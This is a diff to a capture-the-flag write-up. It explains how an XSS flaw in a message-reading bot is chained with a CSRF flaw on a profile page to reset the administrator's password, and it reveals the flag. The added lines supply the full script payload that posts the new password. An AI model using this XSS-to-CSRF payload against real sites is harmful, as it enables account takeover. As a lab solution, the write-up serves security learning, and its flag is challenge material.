@@ -5,4 +5,18 @@
 Stage 1: Identifiying XSS in the bot. The bot auto reads the message thus executing arbitrary code. If you try to dump the document.cookie it just says HAHA NICE TRY!
 Stage 2: The profile page only requires a new password but doesn't ask for your old password, thus confirming the presence of a CSRF vulnerability
 
-Using stage 2 as the payload to send to stage 1 you are able to change the administators password and gain access to that account revealing the final flag: flag{csrf_is_dangerous}
+Using stage 2 as the payload to send to stage 1 you are able to change the administrators password and gain access to that account revealing the final flag: flag{csrf_is_dangerous}
+
+Here is the message you would want to send:
+
+<script>
+    var http = new XMLHttpRequest();
+    var url = "https://portal.ctf-game.xyz/dashboard?page=profile";
+    var params = "password=testing&confirm_password=testing";
+    http.open("POST", url, true);
+
+    //Send the proper header information along with the request
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+    http.send(params);
+</script>
